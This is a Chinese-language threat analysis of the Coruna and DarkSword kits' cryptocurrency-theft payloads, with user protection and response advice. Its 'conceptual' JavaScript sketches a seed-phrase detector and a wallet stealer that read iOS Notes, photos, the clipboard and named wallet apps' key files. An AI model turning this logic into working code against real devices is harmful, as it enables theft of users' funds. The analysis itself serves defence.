# Coruna与DarkSword对加密货币用户的定向威胁分析：助记词窃取、钱包攻击与资产保护

## 摘要

Coruna和DarkSword漏洞利用工具的最终阶段载荷专门针对加密货币用户，具备搜索助记词、窃取私钥、识别二维码等能力。Google Threat Intelligence Group的报告显示，Coruna的PlasmaLoader载荷会分析设备图像、搜索备忘录中的备份短语，专门针对加密货币钱包。本文深入分析这些工具对加密货币用户的威胁，并提供资产保护建议。

## 一、加密货币用户成为攻击目标

### 1.1 为什么加密货币用户被针对？

```text
加密货币用户的吸引力：

1. 高价值目标
   - 加密货币资产价值高
   - 一旦窃取难以追回
   - 匿名性吸引犯罪

2. 攻击面广泛
   - 使用多种钱包应用
   - 存储助记词/私钥
   - 频繁进行交易

3. 安全意识参差不齐
   - 部分用户安全意识薄弱
   - 使用不安全的存储方式
   - 访问可疑网站/应用

4. 去中心化特性
   - 没有中央机构保护
   - 被盗后难以冻结
   - 追回成本极高
```

### 1.2 攻击规模

```text
加密货币攻击规模（2024-2026）：

2024年：
- Coruna针对乌克兰加密货币用户
- 通过伪造加密货币网站传播
- 数百名受害者

2025年：
- DarkSword技术扩散
- 更多犯罪组织获得高级能力
- 攻击规模扩大

2026年：
- Coruna/DarkSword工具广泛扩散
- 金融诈骗团伙大量使用
- 全球范围攻击

损失估计：
- 2024年：数千万美元
- 2025年：数亿美元
- 2026年：可能超过10亿美元
```

## 二、Coruna/PlasmaLoader的加密货币窃取机制

### 2.1 助记词搜索

```text
助记词窃取原理：

BIP39助记词：
- 12或24个英文单词
- 从2048个单词表中选择
- 用于恢复钱包

搜索策略：

1. 备忘录搜索
   - 读取Notes数据库
   - 搜索包含助记词的内容
   - 匹配BIP39单词表

2. 文件搜索
   - 扫描文件系统
   - 搜索.txt、.md等文本文件
   - 匹配助记词模式

3. 剪贴板监控
   - 监控剪贴板内容
   - 检测助记词格式
   - 实时窃取

4. 照片识别
   - 扫描照片库
   - OCR识别文本
   - 匹配助记词模式
```

### 2.2 助记词检测算法

```javascript
// 概念代码：助记词检测

class MnemonicDetector {
    constructor() {
        // BIP39单词表（2048个单词）
        this.bip39Words = new Set([
            "abandon", "ability", "able", "about", "above",
            "absent", "absorb", "abstract", "absurd", "abuse",
            // ... 共2048个单词
        ]);
    }
    
    detect(text) {
        // 1. 分词
        let words = text.toLowerCase().split(/\s+/);
        
        // 2. 查找连续的BIP39单词
        let mnemonicWords = [];
        let results = [];
        
        for (let word of words) {
            // 清理单词（去除标点等）
            let cleanWord = word.replace(/[^a-z]/g, "");
            
            if (this.bip39Words.has(cleanWord)) {
                mnemonicWords.push(cleanWord);
            } else {
                // 如果连续单词中断，检查是否形成助记词
                if (mnemonicWords.length >= 12) {
                    results.push({
                        type: "mnemonic",
                        words: mnemonicWords.slice(0, 12),
                        confidence: this.calculateConfidence(mnemonicWords)
                    });
                }
                if (mnemonicWords.length >= 24) {
                    results.push({
                        type: "mnemonic_24",
                        words: mnemonicWords.slice(0, 24),
                        confidence: this.calculateConfidence(mnemonicWords)
                    });
                }
                mnemonicWords = [];
            }
        }
        
        // 检查最后的序列
        if (mnemonicWords.length >= 12) {
            results.push({
                type: "mnemonic",
                words: mnemonicWords.slice(0, 12),
                confidence: this.calculateConfidence(mnemonicWords)
            });
        }
        
        return results;
    }
    
    calculateConfidence(words) {
        // 计算置信度
        // 12个连续BIP39单词 = 高置信度
        // 24个连续BIP39单词 = 极高置信度
        
        if (words.length >= 24) {
            return 0.99; // 几乎确定是助记词
        } else if (words.length >= 12) {
            return 0.95; // 很可能是助记词
        } else {
            return 0.5; // 可能不是
        }
    }
}
```

### 2.3 私钥搜索

```text
私钥窃取原理：

私钥格式：
- 64位十六进制字符串（256位）
- 例如：0x1a2b3c4d...
- 或WIF格式（Base58编码）

搜索策略：

1. 正则匹配
   - 搜索64位十六进制字符串
   - 搜索WIF格式私钥
   - 匹配常见钱包格式

2. 文件搜索
   - 搜索.dat、.key、.json文件
   - 搜索wallet.dat等钱包文件
   - 搜索keystore文件

3. 应用数据
   - 扫描钱包应用数据目录
   - 读取加密钱包文件
   - 尝试解密（如果可能）
```

### 2.4 二维码识别

```text
二维码窃取原理：

1. 照片扫描
   - 扫描设备照片库
   - 检测二维码图像
   - 使用QR解码库

2. 二维码内容分析
   - 解码二维码内容
   - 识别加密货币地址
   - 识别钱包导入格式

3. 数据提取
   - 提取钱包地址
   - 提取私钥（如果包含）
   - 提取导入链接

示例二维码内容：
- bitcoin:1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
- ethereum:0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb
- 钱包导入链接（包含私钥）
```

## 三、DarkSword的加密货币攻击能力

### 3.1 JavaScript-based搜索

```javascript
// 概念代码：DarkSword加密货币搜索

class DarkSwordCryptoSearch {
    constructor(systemInterface) {
        this.sys = systemInterface;
        this.mnemonicDetector = new MnemonicDetector();
    }
    
    async searchAll() {
        let results = {
            mnemonics: [],
            privateKeys: [],
            wallets: [],
            qrCodes: []
        };
        
        // 1. 搜索备忘录
        results.mnemonics.push(...await this.searchNotes());
        
        // 2. 搜索文件系统
        let fileResults = await this.searchFileSystem();
        results.privateKeys.push(...fileResults.privateKeys);
        results.wallets.push(...fileResults.wallets);
        
        // 3. 搜索照片（二维码）
        results.qrCodes.push(...await this.searchPhotos());
        
        // 4. 搜索剪贴板
        let clipboard = await this.sys.getClipboard();
        let clipboardResults = this.mnemonicDetector.detect(clipboard);
        results.mnemonics.push(...clipboardResults);
        
        // 5. 搜索应用数据
        let appResults = await this.searchAppData();
        results.wallets.push(...appResults);
        
        return results;
    }
    
    async searchNotes() {
        // 读取备忘录数据库
        let notesDb = "/var/mobile/Library/Notes/notesV7.sqlite";
        let notes = await this.sys.readSQLite(notesDb);
        
        let results = [];
        
        for (let note of notes) {
            let content = (note.title || "") + " " + (note.body || "");
            
            // 检测助记词
            let mnemonics = this.mnemonicDetector.detect(content);
            for (let mnemonic of mnemonics) {
                results.push({
                    source: "notes",
                    noteId: note.id,
                    noteTitle: note.title,
                    ...mnemonic
                });
            }
            
            // 检测私钥
            let privateKeys = this.detectPrivateKeys(content);
            for (let key of privateKeys) {
                results.push({
                    source: "notes",
                    noteId: note.id,
                    noteTitle: note.title,
                    ...key
                });
            }
        }
        
        return results;
    }
    
    async searchPhotos() {
        // 扫描照片库
        let photoDir = "/var/mobile/Media/DCIM/";
        let photos = await this.sys.listFiles(photoDir, {recursive: true});
        
        let results = [];
        
        for (let photo of photos) {
            if (!photo.name.match(/\.(jpg|jpeg|png|heic)$/i)) {
                continue;
            }
            
            // 检测二维码
            let qrCodes = await this.detectQRCodes(photo.path);
            
            for (let qr of qrCodes) {
                // 分析二维码内容
                let analysis = this.analyzeQRContent(qr.content);
                
                if (analysis.isCryptoRelated) {
                    results.push({
                        source: "photo",
                        photoPath: photo.path,
                        qrContent: qr.content,
                        ...analysis
                    });
                }
            }
        }
        
        return results;
    }
    
    analyzeQRContent(content) {
        // 分析二维码内容是否为加密货币相关
        
        // 1. 检查是否为加密货币地址
        if (content.match(/^bitcoin:/i)) {
            return {isCryptoRelated: true, type: "bitcoin_address"};
        }
        if (content.match(/^ethereum:/i)) {
            return {isCryptoRelated: true, type: "ethereum_address"};
        }
        
        // 2. 检查是否为钱包导入链接
        if (content.includes("import") && content.includes("key")) {
            return {isCryptoRelated: true, type: "wallet_import"};
        }
        
        // 3. 检查是否为私钥
        if (content.match(/^[0-9a-fA-F]{64}$/)) {
            return {isCryptoRelated: true, type: "private_key"};
        }
        
        return {isCryptoRelated: false};
    }
}
```

### 3.2 钱包应用数据窃取

```javascript
// 概念代码：钱包应用数据窃取

class WalletDataStealer {
    constructor(systemInterface) {
        this.sys = systemInterface;
        
        // 已知钱包应用的Bundle ID
        this.walletApps = [
            // Bitcoin钱包
            "com.blockchain.info",
            "com.samourai.wallet",
            "io.bluewallet.bluewallet",
            
            // Ethereum钱包
            "io.metamask",
            "com.trustwallet.app",
            "im.token.app",
            
            // 多币种钱包
            "com.exodus.mobile",
            "com.ledger.live",
            "com.coinbase.ios"
        ];
    }
    
    async stealAll() {
        let results = [];
        
        for (let appId of this.walletApps) {
            // 检查应用是否安装
            let installed = await this.isAppInstalled(appId);
            if (!installed) continue;
            
            // 获取应用数据路径
            let dataPath = await this.getAppDataPath(appId);
            
            // 搜索钱包数据
            let walletData = await this.searchWalletData(dataPath);
            
            if (walletData.length > 0) {
                results.push({
                    appId: appId,
                    dataPath: dataPath,
                    data: walletData
                });
            }
        }
        
        return results;
    }
    
    async searchWalletData(dataPath) {
        let results = [];
        
        // 搜索常见钱包文件
        let patterns = [
            "**/wallet.dat",
            "**/*.key",
            "**/keystore/**/*.json",
            "**/seed*",
            "**/backup*",
            "**/*.mnemonic"
        ];
        
        for (let pattern of patterns) {
            let files = await this.sys.glob(dataPath + "/" + pattern);
            
            for (let file of files) {
                let content = await this.sys.readFile(file);
                
                results.push({
                    path: file,
                    size: content.length,
                    // 不直接存储内容，只存储元数据
                    // 实际攻击中会上传到C2
                    hash: await this.sys.sha256(content)
                });
            }
        }
        
        return results;
    }
}
```

## 四、资产保护建议

### 4.1 助记词保护

```text
助记词保护最佳实践：

✓ 正确做法：
1. 纸质备份
   - 手写在纸上
   - 存放在安全地点（保险箱）
   - 不拍照、不扫描
   
2. 金属备份
   - 使用助记词金属板
   - 防火、防水、防腐蚀
   - 长期保存

3. 分片备份
   - 将助记词分成多份
   - 存放在不同地点
   - 需要多份才能恢复

✗ 错误做法：
1. 存储在电子设备
   - 备忘录、文本文件
   - 截图、照片
   - 云存储
   
2. 不安全的方式
   - 发送到自己的邮箱
   - 存储在密码管理器（有争议）
   - 告诉他人
```

### 4.2 私钥保护

```text
私钥保护最佳实践：

✓ 正确做法：
1. 硬件钱包
   - Ledger、Trezor等
   - 私钥永不离开设备
   - 物理确认交易
   
2. 冷存储
   - 离线生成私钥
   - 离线存储
   - 需要时导入（谨慎）

3. 多重签名
   - 多个私钥控制
   - 需要多个签名
   - 降低单点风险

✗ 错误做法：
1. 热钱包存储大量资产
   - 手机钱包
   - 浏览器插件钱包
   - 交易所钱包
   
2. 不安全的存储
   - 明文存储
   - 弱密码加密
   - 共享私钥
```

### 4.3 设备安全

```text
设备安全建议：

1. 系统安全
   - 及时更新iOS
   - 启用锁定模式
   - 使用强密码
   
2. 应用安全
   - 只从App Store下载
   - 检查应用权限
   - 警惕可疑应用
   
3. 网络安全
   - 不访问可疑链接
   - 使用VPN（可信 provider）
   - 警惕公共WiFi
   
4. 行为安全
   - 不在设备上存储助记词
   - 不拍摄助记词照片
   - 谨慎分享屏幕
```

### 4.4 交易安全

```text
交易安全建议：

1. 地址验证
   - 仔细检查收款地址
   - 使用地址白名单
   - 警惕地址替换攻击
   
2. 交易确认
   - 使用硬件钱包确认
   - 检查交易详情
   - 警惕异常手续费
   
3. 交易所安全
   - 启用双重认证
   - 使用白名单地址
   - 警惕钓鱼网站
   
4. 大额交易
   - 先小额测试
   - 使用多重签名
   - 分散存储
```

## 五、检测与响应

### 5.1 被盗检测

```text
被盗迹象：

1. 钱包异常
   - 未知交易记录
   - 余额异常减少
   - 未知地址接收资金

2. 设备异常
   - 电池消耗异常
   - 网络流量异常
   - 系统性能下降

3. 账户异常
   - 未知登录
   - 密码被修改
   - 双重认证被禁用
```

### 5.2 应急响应

```text
被盗后应急响应：

1. 立即行动
   - 转移剩余资产到新钱包
   - 禁用相关账户
   - 记录被盗信息

2. 报告
   - 向执法部门报告
   - 向交易所报告（如果相关）
   - 在区块链上标记被盗资金

3. 追踪
   - 使用区块链分析工具
   - 追踪资金流向
   - 配合执法调查

4. 预防
   - 分析被盗原因
   - 改进安全措施
   - 提高安全意识
```

## 六、结论

Coruna和DarkSword对加密货币用户构成了严重威胁。这些工具具备专业的加密货币窃取能力，包括助记词搜索、私钥窃取、二维码识别等。

关键威胁：

1. **助记词窃取** — 搜索备忘录、文件、照片中的助记词
2. **私钥窃取** — 扫描文件系统、应用数据中的私钥
3. **二维码识别** — 从照片中提取加密货币地址和私钥
4. **钱包数据窃取** — 访问钱包应用的数据文件

对于加密货币用户，最重要的防护措施是：

1. **永远不要在电子设备中存储助记词** — 使用纸质或金属备份
2. **使用硬件钱包存储大额资产** — 私钥永不离开设备
3. **及时更新系统，启用锁定模式** — 减少攻击面
4. **警惕可疑链接和网页** — 不访问不明来源的网站

加密货币的安全不仅取决于区块链技术本身，还取决于用户的安全实践。只有采取正确的防护措施，才能有效保护数字资产安全。
